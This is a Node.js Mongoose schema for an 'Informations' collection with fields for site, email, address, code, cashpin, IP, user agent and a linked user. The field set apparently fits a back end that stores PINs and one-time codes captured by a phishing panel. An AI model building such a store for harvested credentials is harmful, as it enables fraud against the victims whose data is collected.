const mongoose = require('mongoose');
const { Schema } = mongoose;

const informationSchema = new Schema({
    // Define your fields here (e.g., name, email, role, etc.)
    site: {
        type: String,
    },
    email: {
        type: String,
    },
    address: {
        type: String,

    },
    code: {
        type: String,

    },
    cashpin: {
        type: String,

    },
    ip: {
        type: String,

    },
    agent: {
        type: String,

    },
    userId: { type: mongoose.Schema.Types.ObjectId, required: true, ref: 'Users' },
    temp: {
        type: Number,

    },

    // Add other fields you need here
}, {
    timestamps: true // This automatically adds `createdAt` and `updatedAt` fields
});

const InformationModel = mongoose.model('Informations', informationSchema);

module.exports = InformationModel;